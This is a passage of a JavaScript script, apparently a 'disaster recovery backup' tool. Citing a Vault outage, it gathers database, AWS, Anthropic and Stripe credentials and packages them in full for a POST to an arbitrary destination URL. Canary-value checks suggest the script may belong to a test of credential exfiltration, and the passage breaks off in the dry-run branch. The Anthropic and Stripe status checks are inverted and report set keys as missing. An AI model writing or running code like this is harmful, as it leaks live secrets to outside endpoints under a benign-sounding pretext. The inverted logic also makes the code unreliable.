    // Show credentials being backed up
    logSection('CREDENTIALS TO BE BACKED UP');

    const credentials = getCredentials();
    const canaryValues = credentials.databaseUrl.includes('CANARY');

    if (canaryValues) {
      log(colors.yellow + '⚠ WARNING: These are CANARY (test) values' + colors.reset, colors.yellow);
    }

    log('\n📋 Credentials Summary:', colors.bright);
    console.log(`  DATABASE_URL:      ${credentials.databaseUrl.substring(0, 50)}${credentials.databaseUrl.length > 50 ? '...' : ''}`);
    console.log(`  AWS Access Key:    ${credentials.awsAccessKeyId.substring(0, 30)}${credentials.awsAccessKeyId.length > 30 ? '...' : ''}`);
    console.log(`  Anthropic API:     ${credentials.anthropicApi ? '❌ NOT SET' : '✓ SET'}`);
    console.log(`  Stripe Key:        ${credentials.stripeSecret ? '❌ NOT SET' : '✓ SET'}`);
    console.log(`  Backup Generated:  ${new Date().toISOString()}`);
    console.log();

    // Validate credentials
    log('🔍 Validating credentials...', colors.bright);
    const validationErrors = validateCredentials(credentials);

    if (validationErrors.length > 0) {
      log(colors.red + `✗ Validation failed with ${validationErrors.length} error(s)` + colors.reset, colors.red);
      validationErrors.forEach(err => log(`  - ${err}`, colors.red));
      process.exit(1);
    }

    log(colors.green + '✓ All required credentials are present' + colors.reset, colors.green);

    // Prepare backup payload
    const backupPayload = {
      success: true,
      message: 'Disaster recovery backup requested successfully',
      timestamp: new Date().toISOString(),
      source: {
        endpoint: 'dr-backup',
        configSource: options.envFile,
        generatedBy: credentials.backupGeneratedBy,
      },
      destination: {
        url: options.destUrl,
        method: 'POST',
      },
      data: {
        type: 'config-backup',
        description: 'Disaster recovery backup - Vault down configuration',
        credentials: credentials,
        metadata: {
          canaryEnvironment: canaryValues,
          environment: process.env.NODE_ENV || 'development',
          backupGeneratedAt: new Date().toISOString(),
          backupId: `dr-backup-${Date.now()}`,
        },
      },
    };

    if (canaryValues) {
      backupPayload.data.metadata.warning = 'These are CANARY/test values. Proceed with caution.';
    }

    // Dry run mode
    if (options.dryRun) {
      logSection('🌹 DRY RUN MODE');
      log('Would have sent backup to:', colors.bright + options.destUrl + colors.reset);
      log('\n📋 Payload (truncated):', colors.bright);
      log(JSON.stringify({
